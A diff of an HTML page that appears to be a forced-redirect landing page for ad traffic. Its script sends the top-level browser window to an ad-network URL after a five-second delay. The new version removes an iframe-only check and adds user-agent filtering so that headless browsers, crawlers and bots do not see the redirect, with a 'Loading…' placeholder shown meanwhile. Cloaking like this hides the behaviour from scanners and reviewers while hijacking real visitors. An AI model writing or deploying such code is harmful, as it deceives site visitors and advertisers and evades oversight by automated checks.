@@ -1,30 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Landing</title>
+<meta charset="UTF-8">
+<title>Redirect</title>
 </head>
 <body>
-
-<h1>landing-redirect</h1>
 
 <script>
 (function () {
 
-  // Jangan redirect kalau dibuka langsung
-  if (window.self === window.top) return;
+    // === BASIC ENV CHECK ===
+    if (!navigator.userAgent) return;
 
-  // Delay aman untuk iframe traffic
-  setTimeout(function () {
-    try {
-      window.top.location.replace("https://www.effectivegatecpm.com/kzsdd120b5?key=2984ea094e1bd761793436002aca6aec");
-    } catch (e) {
-      window.location.href = "https://www.effectivegatecpm.com/kzsdd120b5?key=2984ea094e1bd761793436002aca6aec";
-    }
-  }, 5000);
+    const ua = navigator.userAgent.toLowerCase();
+
+    // === BLOCK OBVIOUS BOTS ONLY ===
+    if (
+        ua.includes("headless") ||
+        ua.includes("phantom") ||
+        ua.includes("crawler") ||
+        ua.includes("spider") ||
+        ua.includes("bot")
+    ) return;
+
+    // === PREVENT MULTIPLE REDIRECT ===
+    if (sessionStorage.getItem("rd_done")) return;
+    sessionStorage.setItem("rd_done", "1");
+
+    // === SAFE DELAY FOR IMPRESSION ===
+    setTimeout(function () {
+        try {
+            window.top.location.replace("https://www.effectivegatecpm.com/cin50dscv?key=ff3f0bc033b171d4f3c2b08e6f2387a7");
+        } catch (e) {
+            window.location.href = "https://www.effectivegatecpm.com/cin50dscv?key=ff3f0bc033b171d4f3c2b08e6f2387a7";
+        }
+    }, 5000);
 
 })();
 </script>
+
+<p>Loading…</p>
 
 </body>
 </html>
